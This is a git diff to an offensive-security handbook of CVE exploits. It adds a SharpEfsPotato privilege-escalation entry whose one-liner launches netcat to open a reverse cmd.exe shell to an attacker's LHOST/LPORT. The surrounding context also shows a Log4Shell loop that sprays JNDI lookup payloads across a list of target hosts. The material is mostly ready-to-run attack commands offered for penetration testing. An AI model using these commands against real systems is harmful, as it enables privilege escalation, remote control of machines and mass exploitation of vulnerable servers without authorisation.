@@ -7,6 +7,7 @@
 - [Dirty Pipe (CVE-2022-0847)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#Dirty-Pipe-CVE-2022-0847)
 - [Juicy Potato](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#Juicy-Potato)
 - [Log4j / Log4Shell (CVE-2021-44228)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#Log4j--Log4Shell-CVE-2021-44228)
+- [SharpEfsPotato](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#SharpEfsPotato)
 - [Shocker](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#Shocker)
 
 ## Resources
@@ -126,6 +127,13 @@ C:\> .\exploit.exe
 
 ```c
 cat targets.txt | while read host do; do curl -sk --insecure --path-as-is "$host/?test=${jndi:[ldap://TOKEN.canarytokens.com/a](ldap://TOKEN.canarytokens.com/a)}" -H "X-Api-Version: ${jndi:[ldap://TOKEN.canarytokens.com/a](ldap://TOKEN.canarytokens.com/a)}" -H "User-Agent: ${jndi:[ldap://TOKEN.canarytokens.com/a](ldap://TOKEN.canarytokens.com/a)}";done
+```
+## SharpEfsPotato
+
+> https://github.com/bugch3ck/SharpEfsPotato
+
+```c
+PS C:\> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "C:\nc64.exe -e cmd.exe <LHOST> <LPORT>"
 ```
 
 ## Shocker
